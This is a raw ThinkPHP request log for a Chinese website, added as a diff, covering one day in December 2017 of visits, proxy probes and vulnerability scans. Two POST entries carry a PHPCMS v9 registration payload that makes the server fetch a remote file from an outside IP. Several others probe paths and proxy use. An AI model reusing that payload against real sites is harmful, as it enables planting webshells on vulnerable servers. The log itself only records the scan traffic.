@@ -1,0 +1,1768 @@
+[ 2017-12-11T00:27:52+08:00 ] 172.17.195.153 114.215.45.101 GET /
+[ log ] 39.106.18.60:80/ [运行时间：0.024754s][吞吐率：40.40req/s] [内存消耗：2,781.59kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.106.18.60:80',
+  'connection' => 'Close',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T02:50:17+08:00 ] 172.17.195.153 172.82.166.210 GET http://www.baidu.com/cache/global/img/gs.gif
+[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.011358s][吞吐率：88.04req/s] [内存消耗：1,508.71kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cache',
+    1 => 'global',
+    2 => 'img',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.baidu.com',
+  'user-agent' => 'Mozilla',
+  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T05:53:16+08:00 ] 172.17.195.153 140.205.225.190 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] xinchumenye.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.023736s][吞吐率：42.13req/s] [内存消耗：2,784.02kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'xinchumenye.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '171',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'MNqTaDEQ',
+  'password' => 'MNqTaDEQ',
+  'email' => 'MNqTaDEQ@aliyun.com',
+  'info' => 
+  array (
+    'content' => '&lt;img src=http://120.26.55.211/s.txt?.php#.jpg&gt;',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T05:53:16+08:00 ] 172.17.195.153 140.205.225.190 GET /index.php?m=wap&a=index&siteid=1
+[ log ] xinchumenye.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.023776s][吞吐率：42.06req/s] [内存消耗：2,782.85kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'xinchumenye.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T06:56:30+08:00 ] 172.17.195.153 80.82.78.50 GET http://www.baidu.com/cache/global/img/gs.gif
+[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.011374s][吞吐率：87.92req/s] [内存消耗：1,508.71kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cache',
+    1 => 'global',
+    2 => 'img',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.baidu.com',
+  'user-agent' => 'Mozilla',
+  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T07:40:33+08:00 ] 172.17.195.153 106.11.225.96 GET /
+[ log ] xinchumenye.com/ [运行时间：0.024449s][吞吐率：40.90req/s] [内存消耗：2,782.09kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'host' => 'xinchumenye.com',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T08:27:21+08:00 ] 172.17.195.153 47.93.90.175 GET /
+[ log ] 39.104.10.11:80/ [运行时间：0.023659s][吞吐率：42.27req/s] [内存消耗：2,781.59kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.104.10.11:80',
+  'connection' => 'Close',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T09:16:07+08:00 ] 172.17.195.153 106.11.242.102 GET /
+[ log ] www.xinchumenye.com/ [运行时间：0.024023s][吞吐率：41.63req/s] [内存消耗：2,782.41kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'host' => 'www.xinchumenye.com',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T09:57:16+08:00 ] 172.17.195.153 123.59.78.122 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.025073s][吞吐率：39.88req/s] [内存消耗：2,781.14kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.106.4.226:80',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T09:57:16+08:00 ] 172.17.195.153 106.75.2.81 GET /
+[ log ] 39.106.4.226/ [运行时间：0.023766s][吞吐率：42.08req/s] [内存消耗：2,782.29kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.106.4.226',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T14:40:24+08:00 ] 172.17.195.153 140.205.225.202 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] xinchumenye.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.024241s][吞吐率：41.25req/s] [内存消耗：2,784.02kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'xinchumenye.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '171',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'yhmLtPxF',
+  'password' => 'yhmLtPxF',
+  'email' => 'yhmLtPxF@aliyun.com',
+  'info' => 
+  array (
+    'content' => '&lt;img src=http://120.26.55.211/s.txt?.php#.jpg&gt;',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T14:40:26+08:00 ] 172.17.195.153 140.205.225.202 GET /index.php?m=wap&a=index&siteid=1
+[ log ] xinchumenye.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.024886s][吞吐率：40.18req/s] [内存消耗：2,782.85kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'xinchumenye.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T15:41:25+08:00 ] 172.17.195.153 123.59.146.153 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.024071s][吞吐率：41.54req/s] [内存消耗：2,782.23kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.106.4.226:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept' => 'application/json, text/plain, */*',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T16:21:03+08:00 ] 172.17.195.153 47.93.90.175 GET /
+[ log ] 39.104.30.80:80/ [运行时间：0.024741s][吞吐率：40.42req/s] [内存消耗：2,781.59kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.104.30.80:80',
+  'connection' => 'Close',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T16:51:13+08:00 ] 172.17.195.153 94.102.49.174 GET http://www.baidu.com/cache/global/img/gs.gif
+[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.011248s][吞吐率：88.90req/s] [内存消耗：1,508.71kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cache',
+    1 => 'global',
+    2 => 'img',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.baidu.com',
+  'user-agent' => 'Mozilla',
+  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T17:36:04+08:00 ] 172.17.195.153 217.127.234.235 GET /
+[ log ] xinchumenye.com/ [运行时间：0.024035s][吞吐率：41.61req/s] [内存消耗：2,781.79kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'xinchumenye.com',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.13.0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T19:20:19+08:00 ] 172.17.195.153 139.162.88.63 GET http://clientapi.ipip.net/echo.php?info=1234567890
+[ log ] clientapi.ipip.nethttp://clientapi.ipip.net/echo.php?info=1234567890 [运行时间：0.011234s][吞吐率：89.02req/s] [内存消耗：1,509.29kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'echo.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'clientapi.ipip.net',
+  'user-agent' => 'Go-http-client/1.1',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'info' => '1234567890',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T19:44:01+08:00 ] 172.17.195.153 172.104.108.109 GET /
+[ log ] 39.106.4.226/ [运行时间：0.024877s][吞吐率：40.20req/s] [内存消耗：2,781.66kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.106.4.226',
+  'user-agent' => 'Mozilla/5.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:26:55+08:00 ] 172.17.195.153 140.205.225.185 GET /
+[ log ] 39.106.4.226/ [运行时间：0.024461s][吞吐率：40.88req/s] [内存消耗：2,781.94kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.p)',
+  'host' => '39.106.4.226',
+  'referer' => 'http://39.106.4.226/',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip,deflate',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:26:58+08:00 ] 172.17.195.153 140.205.225.185 GET /rs-status
+[ log ] 39.106.4.226:80/rs-status [运行时间：0.011592s][吞吐率：86.27req/s] [内存消耗：1,508.94kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'rs-status',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:26:58+08:00 ] 172.17.195.153 140.205.225.185 GET /ganglia/index.php
+[ log ] 39.106.4.226:80/ganglia/index.php [运行时间：0.011304s][吞吐率：88.47req/s] [内存消耗：1,509.27kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ganglia',
+    1 => 'index.php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:26:59+08:00 ] 172.17.195.153 140.205.225.185 GET /index.php
+[ log ] 39.106.4.226:80/index.php [运行时间：0.023653s][吞吐率：42.28req/s] [内存消耗：2,782.26kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:02+08:00 ] 172.17.195.153 140.205.225.185 GET /jobs/
+[ log ] 39.106.4.226:80/jobs/ [运行时间：0.011552s][吞吐率：86.57req/s] [内存消耗：1,508.91kb] [文件加载：37]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'jobs',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
+  'host' => '39.106.4.226:80',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T20:27:08+08:00 ] 172.17.195.153 140.205.225.185 GET /
+[ log ] 39.106.4.226:80/ [运行时间：0.024966s][吞吐率：40.05req/s] [内存消耗：2,782.24kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'http://39.106.4.226/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
